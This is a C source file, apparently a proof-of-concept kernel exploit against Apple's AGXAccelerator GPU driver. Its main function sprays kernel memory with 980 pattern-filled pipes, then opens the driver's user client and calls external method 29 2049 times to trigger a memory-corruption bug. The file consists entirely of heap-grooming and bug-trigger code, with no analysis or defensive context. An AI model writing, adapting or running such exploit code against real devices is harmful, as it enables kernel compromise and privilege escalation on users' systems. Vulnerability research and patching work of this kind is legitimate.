#include "iokit.h"
#include "piper.h"
#include "port_utils.h"
#include "spray.h"

io_connect_t IOGPU_init(void)
{
    mach_port_t mp = MACH_PORT_NULL;
    kern_return_t IOMasterPort(mach_port_t, mach_port_t *);
    IOMasterPort(MACH_PORT_NULL, &mp);
    io_connect_t uc;

    io_service_t s = IOServiceGetMatchingService(mp, IOServiceMatching("AGXAccelerator"));
    if (s == MACH_PORT_NULL)
    {
        return 0;
    }
    
    if (IOServiceOpen(s, mach_task_self(), 1, &uc) != KERN_SUCCESS)
    {
        return 0;
    }
    
    return uc;
}

uint32_t IOGPU_create_mtllateeventevent(io_connect_t uc)
{
    uint64_t Output[2] = {0};
    uint64_t OutputCount = 2;

    kern_return_t kr = IOConnectCallMethod(uc, 29, 0, 0, 0, 0, Output, &OutputCount, 0, 0);

    if (kr)
        return 0;
    
    return 1;
}

int main(int argc, char *argv[], char *envp[]) {

    // prepare spray stuffs
    increase_file_limit();
    size_t pipe_count = 980;
    size_t pipe_buffer_size = 0x4000;
    uint8_t *pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
    int *pipefds = create_pipes(&pipe_count);
    uint64_t val = 0x4142434445464748;
    memset_pattern8(pipe_buffer, &val, pipe_buffer_size);
    pipe_spray(pipefds, pipe_count, pipe_buffer, pipe_buffer_size, NULL);

    //trigger bug
    io_connect_t uc = IOGPU_init();
    printf("uc = 0x%x\n", uc);

    for(int i = 0; i < 2049; i++) {
        IOGPU_create_mtllateeventevent(uc);
    }

	return 0;
}
